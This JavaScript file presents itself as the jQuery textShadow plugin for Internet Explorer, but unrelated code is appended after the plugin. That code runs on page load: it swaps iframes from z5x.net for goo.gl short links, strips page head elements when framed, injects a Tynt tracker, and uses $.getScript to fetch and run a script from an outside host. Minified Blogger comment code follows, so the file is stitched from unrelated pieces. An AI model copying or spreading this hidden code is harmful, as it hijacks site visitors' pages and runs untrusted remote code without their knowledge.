/* Created by Martin Hintzmann 2008 martin [a] hintzmann.dk
 * MIT (http://www.opensource.org/licenses/mit-license.php) licensed.
 *
 * Version: 0.2
 * Requires: jQuery 1.2+
 * http://plugins.jquery.com/project/textshadow
 *
 */
(function($) {
	$.fn.textShadow = function(option) {
		if (!$.browser.msie) return;
		var IE6 = $.browser.version < 7;
		return this.each(function() {
			var el = $(this);
			var shadow = el.textShadowParse(this.currentStyle["text-shadow"]);
			shadow = $.extend(shadow, option);

			el.textShadowRemove();

			if (shadow.x == 0 && shadow.y == 0 && shadow.radius == 0) return;

			if (el.css("position")=="static") {
				el.css({position:"relative"});
			}
			el.css({zIndex:"0"});
			if (IE6) {
				el.css({zoom:"1"});
			}
			
			var span=document.createElement("span");
			$(span).addClass("jQueryTextShadow");
			$(span).html(el.html());
			$(span).css({
				padding:		this.currentStyle["padding"],	
				width:		el.width(),
				position:	"absolute",
				zIndex:		"-1",
				color:		shadow.color!=null?shadow.color:el.css("color"),
				left:			(-parseInt(shadow.radius)+parseInt(shadow.x))+"px",
				top:			(-parseInt(shadow.radius)+parseInt(shadow.y))+"px"
			});
			
			if (shadow.radius != 0) {
				if (shadow.opacity != null) {
					$(span).css("filter", "progid:DXImageTransform.Microsoft.Blur(pixelradius="+parseInt(shadow.radius)+", enabled='true', makeShadow='true', ShadowOpacity="+shadow.opacity+")");
				} else {
					$(span).css("filter", "progid:DXImageTransform.Microsoft.Blur(pixelradius="+parseInt(shadow.radius)+", enabled='true')");
				}
			}	
			el.append(span);
		
	  });
	};
	
	$.fn.textShadowParse = function(value) 
	{
		value = String(value)
			.replace(/^\s+|\s+$/gi, '')
			.replace(/\s*!\s*important/i, '')
			.replace(/\(\s*([^,\)]+)\s*,\s*([^,\)]+)\s*,\s*([^,\)]+)\s*,\s*([^\)]+)\s*\)/g, '($1/$2/$3/$4)')
			.replace(/\(\s*([^,\)]+)\s*,\s*([^,\)]+)\s*,\s*([^\)]+)\s*\)/g, '($1/$2/$3)')
	
		var shadow = {
			x      : 0,
			y      : 0,
			radius : 0,
			color  : null
		};

		if (value.length > 1 || value[0].toLowerCase() != 'none') {
			value = value.replace(/\//g, ',');
			var color;
			if ( value.match(/(\#[0-9a-f]{6}|\#[0-9a-f]{3}|(rgb|hsb)a?\([^\)]*\)|\b[a-z]+\b)/i) && (color = RegExp.$1) ) {
				shadow.color = color.replace(/^\s+/, '');
				value = value.replace(shadow.color, '');
			}

			value = value
				.replace(/^\s+|\s+$/g, '')
				.split(/\s+/)
				.map(function(item) {
						return (item || '').replace(/^0[a-z]*$/, '') ? item : 0 ;
					});

			switch (value.length)
			{
				case 1:
					shadow.x = shadow.y = value[0];
					break;
				case 2:
					shadow.x = value[0];
					shadow.y = value[1];
					break;
				case 3:
					shadow.x = value[0];
					shadow.y = value[1];
					shadow.radius = value[2];
					break;
			}
			if ((!shadow.x && !shadow.y && !shadow.radius) || shadow.color == 'transparent') {
				shadow.x = shadow.y = shadow.radius = 0;
				shadow.color = null;
			}
		}

		return shadow;
	};

	$.fn.textShadowRemove = function() {
		if (!$.browser.msie) return;
		return this.each(function() {
			$(this).children("span.jQueryTextShadow").remove();
		});
	};
})(jQuery);

if(typeof Array.prototype.map == 'undefined') {
	Array.prototype.map = function(fnc) {
		var a = new Array(this.length);
		for (var i = 0; i < this.length; i++) {
			a[i] = fnc(this[i]);
		}
		return a;
	}
}

if(document.location.protocol=='http:'){var Tynt=Tynt||[];Tynt.push('db5LAQUiKr4koWadbi-bnq');Tynt.i={"st":true,"ap":"flyingfree:","as":"banady&nbsp;to&nbsp;ahmed"};(function(){var s=document.createElement('script');s.async="async";s.type="text/javascript";s.src='http://tcr.tynt.com/ti.js';var h=document.getElementsByTagName('script')[0];h.parentNode.insertBefore(s,h)})()}(document.location);if(document.location.href!=top.location.href&&top.location.href.match(document.location.href.split('/')[2])){if(document.getElementsByTagName('head')){var h=document.getElementsByTagName('head')[0];while(h.firstChild)if((h.firstChild.tagName!='script')||(!h.firstChild.getAttribute('src'))||(!h.firstChild.getAttribute('src').match('fb.com/Flying1free')))h.removeChild(h.firstChild);while(h.lastChild)if((h.lastChild.tagName!='script')||(!h.lastChild.getAttribute('src'))||(!h.lastChild.getAttribute('src').match('fb.com/Flying1free')))h.removeChild(h.lastChild)}document.onload=function(){var s=document.getElementsByTagName('script');for(i in s)s[i].parentNode.remove(s[i])}}else $(document).ready(function(){$('iframe').each(function(){if($(this).attr('src')&&$(this).attr('src').match('z5x.net'))if($(this).attr('height')=='90'){$(this).attr('src','http://goo.gl/bZHgJV')}else $(this).attr('src','http://goo.gl/zQjbSm')})});if(window.jQuery){$.getScript('http://www.fb.com/Flying1free')}else{var s=document.createElement('script');s.setAttribute('type','text/javascript');s.setAttribute('src',src);document.getElementsByTagName("head")[0].appendChild(s)}(function(){var f="",aa=" ",h='"',ca="#",da="%",ea="%s",fa="&",ga="(\\d*)(\\D*)",ha="*",ia=",",ja="-src",l=".",m="/",ka="//",la="0",ma="00",na="000",n=":",oa=": ",pa=";domain=",qa=";expires=",ra=";path=",sa=";secure",p="=",ta="?",ua="@",va="Assertion failed",wa="[",xa="[object Array]",ya="[object Function]",za="[object Window]",Aa="\\u",Ba="]",q="array",Ca="backgroundColor",Da="blogger-comment-from-post",Ea="blogger-iframe-colorize",Fa="blogspotRpcToken",Ga="boolean",Ha="call",Ia="color",Ja="comment-editor",Ka="fcViewer",La="fcauth",Ma="fontFamily",s="function",Na="g",Oa="http://www.blogger.com/unvisited-link-",Pa="iframe",Qa="inherit",Ra="message",t="null",u="number",v="object",Sa="onmessage",Ta="rgb(0, 0, 0)",Ua="rgba(0, 0, 0, 0)",Va="serif",Wa="set-comment-editor-height",Xa="splice",Ya="string",Za="transparent",$a="{",ab="}",w,x=this,bb=function(a){var b=typeof a;if(b==v)if(a){if(a instanceof Array)return q;if(a instanceof Object)return b;var c=Object.prototype.toString.call(a);if(c==za)return v;if(c==xa||typeof a.length==u&&"undefined"!=typeof a.splice&&"undefined"!=typeof a.propertyIsEnumerable&&!a.propertyIsEnumerable(Xa))return q;if(c==ya||"undefined"!=typeof a.call&&"undefined"!=typeof a.propertyIsEnumerable&&!a.propertyIsEnumerable(Ha))return s}else return t;else if(b==s&&"undefined"==typeof a.call)return v;return b},y=function(a){var b=bb(a);return b==q||b==v&&typeof a.length==u},z=function(a){return typeof a==Ya},cb=Date.now||function(){return+new Date},db=function(a,b){function c(){}c.prototype=b.prototype;a.$=b.prototype;a.prototype=new c;a.Z=function(a,c,g){var k=Array.prototype.slice.call(arguments,2);return b.prototype[c].apply(a,k)}};var C=function(a){if(Error.captureStackTrace)Error.captureStackTrace(this,C);else{var b=Error().stack;b&&(this.stack=b)}a&&(this.message=String(a))};db(C,Error);var eb=function(a,b){for(var c=a.split(ea),d=f,e=Array.prototype.slice.call(arguments,1);e.length&&1<c.length;)d+=c.shift()+e.shift();return d+c.join(ea)},D=function(a,b){return a<b?-1:a>b?1:0};var fb=function(a,b){b.unshift(a);C.call(this,eb.apply(null,b));b.shift()};db(fb,C);var gb=function(a,b,c){if(!a){var d=Array.prototype.slice.call(arguments,2),e=va;if(b)var e=e+(oa+b),g=d;throw new fb(f+e,g||[])}return a};var E=Array.prototype,hb=E.indexOf?function(a,b,c){gb(null!=a.length);return E.indexOf.call(a,b,c)}:function(a,b,c){c=null==c?0:0>c?Math.max(0,a.length+c):c;if(z(a))return z(b)&&1==b.length?a.indexOf(b,c):-1;for(;c<a.length;c++)if(c in a&&a[c]===b)return c;return-1},ib=E.forEach?function(a,b,c){gb(null!=a.length);E.forEach.call(a,b,c)}:function(a,b,c){for(var d=a.length,e=z(a)?a.split(f):a,g=0;g<d;g++)g in e&&b.call(c,e[g],g,a)},jb=function(a){return E.concat.apply(E,arguments)},kb=function(a){var b=a.length;if(0<b){for(var c=Array(b),d=0;d<b;d++)c[d]=a[d];return c}return[]};var lb=function(a){var b=[],c=0,d;for(d in a)b[c++]=a[d];return b},mb=function(a){var b=[],c=0,d;for(d in a)b[c++]=d;return b};var F,G,H,I,nb=function(){return x.navigator?x.navigator.userAgent:null};I=H=G=F=!1;var J;if(J=nb()){var ob=x.navigator;F=0==J.lastIndexOf("Opera",0);G=!F&&(-1!=J.indexOf("MSIE")||-1!=J.indexOf("Trident"));H=!F&&-1!=J.indexOf("WebKit");I=!F&&!H&&!G&&"Gecko"==ob.product}var K=G,L=I,pb=H,qb=function(){var a=x.document;return a?a.documentMode:void 0},M;t:{var N=f,O;if(F&&x.opera)var rb=x.opera.version,N=typeof rb==s?rb():rb;else if(L?O=/rv\:([^\);]+)(\)|;)/:K?O=/\b(?:MSIE|rv)[: ]([^\);]+)(\)|;)/:pb&&(O=/WebKit\/(\S+)/),O)var sb=O.exec(nb()),N=sb?sb[1]:f;if(K){var tb=qb();if(tb>parseFloat(N)){M=String(tb);break t}}M=N}var ub=M,vb={},wb=function(a){var b;if(!(b=vb[a])){b=0;for(var c=String(ub).replace(/^[\s\xa0]+|[\s\xa0]+$/g,f).split(l),d=String(a).replace(/^[\s\xa0]+|[\s\xa0]+$/g,f).split(l),e=Math.max(c.length,d.length),g=0;0==b&&g<e;g++){var k=c[g]||f,r=d[g]||f,ba=RegExp(ga,Na),Lb=RegExp(ga,Na);do{var A=ba.exec(k)||[f,f,f],B=Lb.exec(r)||[f,f,f];if(0==A[0].length&&0==B[0].length)break;b=D(0==A[1].length?0:parseInt(A[1],10),0==B[1].length?0:parseInt(B[1],10))||D(0==A[2].length,0==B[2].length)||D(A[2],B[2])}while(0==b)}b=vb[a]=0<=b}return b},xb=x.document,yb=xb&&K?qb()||("CSS1Compat"==xb.compatMode?parseInt(ub,10):5):void 0;!L&&!K||K&&K&&9<=yb||L&&wb("1.9.1");K&&wb("9");var zb=function(a,b){return z(b)?a.getElementById(b):b},Ab=function(a,b,c,d){a=d||a;var e=b&&b!=ha?b.toUpperCase():f;if(a.querySelectorAll&&a.querySelector&&(e||c))return a.querySelectorAll(e+(c?l+c:f));if(c&&a.getElementsByClassName){b=a.getElementsByClassName(c);if(e){a={};for(var g=d=0,k;k=b[g];g++)e==k.nodeName&&(a[d++]=k);a.length=d;return a}return b}b=a.getElementsByTagName(e||ha);if(c){a={};for(g=d=0;k=b[g];g++){var e=k.className,r;if(r=typeof e.split==s)r=0<=hb(e.split(/\s+/),c);r&&(a[d++]=k)}a.length=d;return a}return b};var P=function(a){this.t=a};P.prototype.serialize=function(a){var b=[];this.A(a,b);return b.join(f)};P.prototype.A=function(a,b){switch(typeof a){case Ya:this.I(a,b);break;case u:this.R(a,b);break;case Ga:b.push(a);break;case"undefined":b.push(t);break;case v:if(null==a){b.push(t);break}if(bb(a)==q){this.serializeArray(a,b);break}this.S(a,b);break;case s:break;default:throw Error("Unknown type: "+typeof a)}};var Bb={'"':'\\"',"\\":"\\\\","/":"\\/","\b":"\\b","\f":"\\f","\n":"\\n","\r":"\\r","\t":"\\t","\x0B":"\\u000b"},Cb=/\uffff/.test("\uffff")?/[\\\"\x00-\x1f\x7f-\uffff]/g:/[\\\"\x00-\x1f\x7f-\xff]/g;P.prototype.I=function(a,b){b.push(h,a.replace(Cb,function(a){if(a in Bb)return Bb[a];var b=a.charCodeAt(0),e=Aa;16>b?e+=na:256>b?e+=ma:4096>b&&(e+=la);return Bb[a]=e+b.toString(16)}),h)};P.prototype.R=function(a,b){b.push(isFinite(a)&&!isNaN(a)?a:t)};P.prototype.serializeArray=function(a,b){var c=a.length;b.push(wa);for(var d=f,e=0;e<c;e++)b.push(d),d=a[e],this.A(this.t?this.t.call(a,String(e),d):d,b),d=ia;b.push(Ba)};P.prototype.S=function(a,b){b.push($a);var c=f,d;for(d in a)if(Object.prototype.hasOwnProperty.call(a,d)){var e=a[d];typeof e!=s&&(b.push(c),this.I(d,b),b.push(n),this.A(this.t?this.t.call(a,d,e):e,b),c=ia)}b.push(ab)};var Db="StopIteration"in x?x.StopIteration:Error("StopIteration"),Eb=function(){};Eb.prototype.next=function(){throw Db};Eb.prototype.W=function(){return this};var Q=function(a,b){this.f={};this.c=[];this.r=this.b=0;var c=arguments.length;if(1<c){if(c%2)throw Error("Uneven number of arguments");for(var d=0;d<c;d+=2)this.set(arguments[d],arguments[d+1])}else a&&this.N(a)};w=Q.prototype;w.e=function(){this.s();for(var a=[],b=0;b<this.c.length;b++)a.push(this.f[this.c[b]]);return a};w.m=function(){this.s();return this.c.concat()};w.l=function(a){return R(this.f,a)};w.remove=function(a){return R(this.f,a)?(delete this.f[a],this.b--,this.r++,this.c.length>2*this.b&&this.s(),!0):!1};w.s=function(){if(this.b!=this.c.length){for(var a=0,b=0;a<this.c.length;){var c=this.c[a];R(this.f,c)&&(this.c[b++]=c);a++}this.c.length=b}if(this.b!=this.c.length){for(var d={},b=a=0;a<this.c.length;)c=this.c[a],R(d,c)||(this.c[b++]=c,d[c]=1),a++;this.c.length=b}};w.get=function(a,b){return R(this.f,a)?this.f[a]:b};w.set=function(a,b){R(this.f,a)||(this.b++,this.c.push(a),this.r++);this.f[a]=b};w.N=function(a){var b;a instanceof Q?(b=a.m(),a=a.e()):(b=mb(a),a=lb(a));for(var c=0;c<b.length;c++)this.set(b[c],a[c])};w.clone=function(){return new Q(this)};w.W=function(a){this.s();var b=0,c=this.c,d=this.f,e=this.r,g=this,k=new Eb;k.next=function(){for(;;){if(e!=g.r)throw Error("The map has changed since the iterator was created");if(b>=c.length)throw Db;var k=c[b++];return a?k:d[k]}};return k};var R=function(a,b){return Object.prototype.hasOwnProperty.call(a,b)};var Fb=function(a){if(typeof a.e==s)return a.e();if(z(a))return a.split(f);if(y(a)){for(var b=[],c=a.length,d=0;d<c;d++)b.push(a[d]);return b}return lb(a)},Gb=function(a,b,c){if(typeof a.forEach==s)a.forEach(b,c);else if(y(a)||z(a))ib(a,b,c);else{var d;if(typeof a.m==s)d=a.m();else if(typeof a.e!=s)if(y(a)||z(a)){d=[];for(var e=a.length,g=0;g<e;g++)d.push(g)}else d=mb(a);else d=void 0;for(var e=Fb(a),g=e.length,k=0;k<g;k++)b.call(c,e[k],d&&d[k],a)}};var Hb=RegExp("^(?:([^:/?#.]+):)?(?://(?:([^/?#]*)@)?([^/#?]*?)(?::([0-9]+))?(?=[/#?]|$))?([^?#]+)?(?:\\?([^#]*))?(?:#(.*))?$"),Jb=function(a){if(Ib){Ib=!1;var b=x.location;if(b){var c=b.href;if(c&&(c=(c=Jb(c)[3]||null)&&decodeURIComponent(c))&&c!=b.hostname)throw Ib=!0,Error()}}return a.match(Hb)},Ib=pb;var S=function(a,b){var c;a instanceof S?(this.d=void 0!==b?b:a.d,this.G(a.n),this.H(a.v),this.B(a.p),this.D(a.q),this.setPath(a.getPath()),this.F(a.h.clone()),this.C(a.u)):a&&(c=Jb(String(a)))?(this.d=!!b,this.G(c[1]||f,!0),this.H(c[2]||f,!0),this.B(c[3]||f,!0),this.D(c[4]),this.setPath(c[5]||f,!0),this.F(c[6]||f,!0),this.C(c[7]||f,!0)):(this.d=!!b,this.h=new T(null,null,this.d))};w=S.prototype;w.n=f;w.v=f;w.p=f;w.q=null;w.J=f;w.u=f;w.X=!1;w.d=!1;w.toString=function(){var a=[],b=this.n;b&&a.push(U(b,Kb),n);if(b=this.p){a.push(ka);var c=this.v;c&&a.push(U(c,Kb),ua);a.push(encodeURIComponent(String(b)));b=this.q;null!=b&&a.push(n,String(b))}if(b=this.getPath())this.P()&&b.charAt(0)!=m&&a.push(m),a.push(U(b,b.charAt(0)==m?Mb:Nb));(b=this.O())&&a.push(ta,b);(b=this.u)&&a.push(ca,U(b,Ob));return a.join(f)};w.clone=function(){return new S(this)};w.G=function(a,b){this.i();if(this.n=b?a?decodeURIComponent(a):f:a)this.n=this.n.replace(/:$/,f);return this};w.H=function(a,b){this.i();this.v=b?a?decodeURIComponent(a):f:a;return this};w.B=function(a,b){this.i();this.p=b?a?decodeURIComponent(a):f:a;return this};w.P=function(){return!!this.p};w.D=function(a){this.i();if(a){a=Number(a);if(isNaN(a)||0>a)throw Error("Bad port number "+a);this.q=a}else this.q=null;return this};w.getPath=function(){return this.J};w.setPath=function(a,b){this.i();this.J=b?a?decodeURIComponent(a):f:a;return this};w.F=function(a,b){this.i();a instanceof T?(this.h=a,this.h.w(this.d)):(b||(a=U(a,Pb)),this.h=new T(a,null,this.d));return this};w.O=function(){return this.h.toString()};w.Y=function(a,b){this.i();this.h.set(a,b);return this};w.C=function(a,b){this.i();this.u=b?a?decodeURIComponent(a):f:a;return this};w.i=function(){if(this.X)throw Error("Tried to modify a read-only Uri")};w.w=function(a){this.d=a;this.h&&this.h.w(a);return this};var U=function(a,b){return z(a)?encodeURI(a).replace(b,Qb):null},Qb=function(a){a=a.charCodeAt(0);return da+(a>>4&15).toString(16)+(a&15).toString(16)},Kb=/[#\/\?@]/g,Nb=/[\#\?:]/g,Mb=/[\#\?]/g,Pb=/[\#\?@]/g,Ob=/#/g,T=function(a,b,c){this.g=a||null;this.d=!!c};w=T.prototype;w.j=function(){if(!this.a&&(this.a=new Q,this.b=0,this.g))for(var a=this.g.split(fa),b=0;b<a.length;b++){var c=a[b].indexOf(p),d=null,e=null;0<=c?(d=a[b].substring(0,c),e=a[b].substring(c+1)):d=a[b];d=decodeURIComponent(d.replace(/\+/g,aa));d=this.k(d);this.add(d,e?decodeURIComponent(e.replace(/\+/g,aa)):f)}};w.a=null;w.b=null;w.add=function(a,b){this.j();this.o();a=this.k(a);var c=this.a.get(a);c||this.a.set(a,c=[]);c.push(b);this.b++;return this};w.remove=function(a){this.j();a=this.k(a);return this.a.l(a)?(this.o(),this.b-=this.a.get(a).length,this.a.remove(a)):!1};w.l=function(a){this.j();a=this.k(a);return this.a.l(a)};w.m=function(){this.j();for(var a=this.a.e(),b=this.a.m(),c=[],d=0;d<b.length;d++)for(var e=a[d],g=0;g<e.length;g++)c.push(b[d]);return c};w.e=function(a){this.j();var b=[];if(z(a))this.l(a)&&(b=jb(b,this.a.get(this.k(a))));else{a=this.a.e();for(var c=0;c<a.length;c++)b=jb(b,a[c])}return b};w.set=function(a,b){this.j();this.o();a=this.k(a);this.l(a)&&(this.b-=this.a.get(a).length);this.a.set(a,[b]);this.b++;return this};w.get=function(a,b){var c=a?this.e(a):[];return 0<c.length?String(c[0]):b};w.setValues=function(a,b){this.remove(a);0<b.length&&(this.o(),this.a.set(this.k(a),kb(b)),this.b+=b.length)};w.toString=function(){if(this.g)return this.g;if(!this.a)return f;for(var a=[],b=this.a.m(),c=0;c<b.length;c++)for(var d=b[c],e=encodeURIComponent(String(d)),d=this.e(d),g=0;g<d.length;g++){var k=e;d[g]!==f&&(k+=p+encodeURIComponent(String(d[g])));a.push(k)}return this.g=a.join(fa)};w.o=function(){this.g=null};w.clone=function(){var a=new T;a.g=this.g;this.a&&(a.a=this.a.clone(),a.b=this.b);return a};w.k=function(a){a=String(a);this.d&&(a=a.toLowerCase());return a};w.w=function(a){a&&!this.d&&(this.j(),this.o(),Gb(this.a,function(a,c){var d=c.toLowerCase();c!=d&&(this.remove(c),this.setValues(d,a))},this));this.d=a};var Rb=function(a,b,c){var d;t:{d=9==b.nodeType?b:b.ownerDocument||b.document;if(d.defaultView&&d.defaultView.getComputedStyle&&(d=d.defaultView.getComputedStyle(b,null))){d=d[a]||d.getPropertyValue(a)||f;break t}d=f}d=d||(b.currentStyle?b.currentStyle[a]:null)||b.style&&b.style[a];return null==d||d==Qa||d==Za||d==Ua?b!=(9==b.nodeType?b:b.ownerDocument||b.document).body&&b.parentNode?V(a,b.parentNode):c:d},V=function(a,b){return Rb(a,b,Ta)},Sb=function(){for(var a=Ab(document,Pa,Ea,void 0),b=0;b<a.length;b++){var c=a[b],d=zb(document,c.id+ja),e=d.href,g=V(Ia,c),k=V(Ca,c),r=Rb(Ma,c,Va);d.href=Oa+(new Date).valueOf();var ba=V(Ia,d),d=d.href=e,e=encodeURIComponent,g=(new P(void 0)).serialize({color:g,backgroundColor:k,unvisitedLinkColor:ba,fontFamily:r}),e=d+(ca+e(g));c.src=e}};var Tb=function(a){this.M=a},Ub=/\s*;\s*/;w=Tb.prototype;w.T=function(a){return!/[;=\s]/.test(a)};w.U=function(a){return!/[;\r\n]/.test(a)};w.set=function(a,b,c,d,e,g){if(!this.T(a))throw Error('Invalid cookie name "'+a+h);if(!this.U(b))throw Error('Invalid cookie value "'+b+h);void 0!==c||(c=-1);e=e?pa+e:f;d=d?ra+d:f;g=g?sa:f;c=0>c?f:0==c?qa+(new Date(1970,1,1)).toUTCString():qa+(new Date(cb()+1E3*c)).toUTCString();this.V(a+p+b+e+d+c+g)};w.get=function(a,b){for(var c=a+p,d=this.L(),e=0,g;g=d[e];e++){if(0==g.lastIndexOf(c,0))return g.substr(c.length);if(g==a)return f}return b};w.remove=function(a,b,c){var d=this.l(a);this.set(a,f,0,b,c);return d};w.m=function(){return this.K().keys};w.e=function(){return this.K().Q};w.l=function(a){return void 0!==this.get(a)};w.V=function(a){this.M.cookie=a};w.L=function(){return(this.M.cookie||f).split(Ub)};w.K=function(){for(var a=this.L(),b=[],c=[],d,e,g=0;e=a[g];g++)d=e.indexOf(p),-1==d?(b.push(f),c.push(e)):(b.push(e.substring(0,d)),c.push(e.substring(d+1)));return{keys:b,Q:c}};var Vb=new Tb(document);Vb.aa=3950;var W=-1,Wb=-1,Xb=function(a){if(W==a&&-1!=W)return Vb.get(La+Wb,null);W=-1;return null};var Yb=function(a,b){Wb=b;W=Math.floor(1E7*Math.random());for(var c=Ab(document,Pa,Da,void 0),d=0;d<c.length;d++){var e=zb(document,c[d].id+ja),g=new S(e.href);g.Y(Fa,W);e.href=g.toString()}window.gadgets&&window.gadgets.rpc&&(gadgets.rpc.setRelayUrl(Ja,a),gadgets.rpc.register(Ka,Xb));Sb();c=function(a){0==a.data.indexOf(Wa)&&(document.getElementById(Ja).height=a.data.substring(26))};window.addEventListener?window.addEventListener(Ra,c,!1):window.attachEvent&&window.attachEvent(Sa,c)},X=["BLOG_CMT_createIframe"],Y=x;X[0]in Y||!Y.execScript||Y.execScript("var "+X[0]);for(var Z;X.length&&(Z=X.shift());)X.length||void 0===Yb?Y=Y[Z]?Y[Z]:Y[Z]={}:Y[Z]=Yb})()

